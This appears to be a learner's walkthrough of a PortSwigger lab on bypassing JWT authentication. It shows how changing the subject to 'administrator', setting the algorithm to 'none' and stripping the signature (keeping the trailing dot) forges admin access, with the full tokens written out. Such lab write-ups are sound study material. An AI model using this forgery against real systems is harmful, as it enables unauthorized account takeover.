Title: JWT authentication bypass via flawed signature verification
Desc:  This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.
To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter 

I get the session cookie: eyJraWQiOiIzMzY3NGI2MC0wYmQxLTRlMGYtOWY5YS1kODkyYTFjM2NiNjEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzMzODM4OSwic3ViIjoid2llbmVyIn0.DIA9XfHnosVjXxGM3b1NYOwQrppAJWuSZSKVCWMHzEwyAYTnP_YDEeKDmIrk_LmyTQN_2_rKGybreLHQZlHWEvIpR0QGqtzShCO1Xyib36xRvPdAcZ2cCz8ZsYz0s3F2pt1TGVEs2G4t-N0h_ay1dwW5ARss3wHFXD29DXDJwcKYw7nsvsDsE1Z_76_apbS-rZ8sgbIUMC6-3nTHg6FhbWjRDBsqnp_ti7Dqmwd1iIjPC_R1NAxguWcn_e-dCMmo7QOezP7Zjiwj8FXidGYEjZYp6V1SAxPbGXUvCG-McXKrrJ6z5egn1MnS5O7DMurNmRZTIvLf6jguWjUsAefIvw
Try to decode it - for example here https://token.dev/

![Zrzut ekranu 2025-03-30 134109](https://github.com/user-attachments/assets/87806579-8380-4b33-a28e-a724ed7749b2)

"/admin" resource is available only for user administrator, so I try to change jwt token and encode:
eyJraWQiOiIzMzY3NGI2MC0wYmQxLTRlMGYtOWY5YS1kODkyYTFjM2NiNjEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzMzODM4OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.YgWov8BcU43weHosS2CIEAiplLPWcaU06dVCgea1ukIpw77A0Y1obYFpVttSzQw3FFS4avY5A5JvLE7fmNiOL0UPHlFqMdDGsGFRdFOh0gCcav9K1JXNZDGXqTzsQry7A3lmPp7c6VXBokLGtbzbtZqft-CLNNo-j_RMn88ryd3-4G7oRlf6nGo8vxkutwj3op85UfBIdMLlGL3NfvC_PRd0xqSksk1tniLvETeNgPksUGqBfqNbWQbzMNDtnwBlUGHDu_0fprMYoCuFza--KQ2izWpxINukVS_alLQrJi-Y_tmC9JAy9SpiYCW4BGYLC6Jm2hIdkrst5aHnrNWFcg

When I try to use token with unproperly signed signature I get no proper output from the app, but I try to delete signature part from the token: 
![image](https://github.com/user-attachments/assets/c97b8c86-195f-4dcb-a176-8e62a4e92a39)


eyJraWQiOiIzMzY3NGI2MC0wYmQxLTRlMGYtOWY5YS1kODkyYTFjM2NiNjEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzMzODM4OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9

I set algorithm as None
eyJraWQiOiIzMzY3NGI2MC0wYmQxLTRlMGYtOWY5YS1kODkyYTFjM2NiNjEiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzMzODM4OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9

I had some issues here, but tutorial helps me a lot: "In the message editor, remove the signature from the JWT, but remember to leave the trailing dot after the payload. "

So, I've added a dot at the end: 
eyJraWQiOiIzMzY3NGI2MC0wYmQxLTRlMGYtOWY5YS1kODkyYTFjM2NiNjEiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzMzODM4OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
![image](https://github.com/user-attachments/assets/04dc3014-9557-455f-91af-48339a24a41a)


And we are an admin!
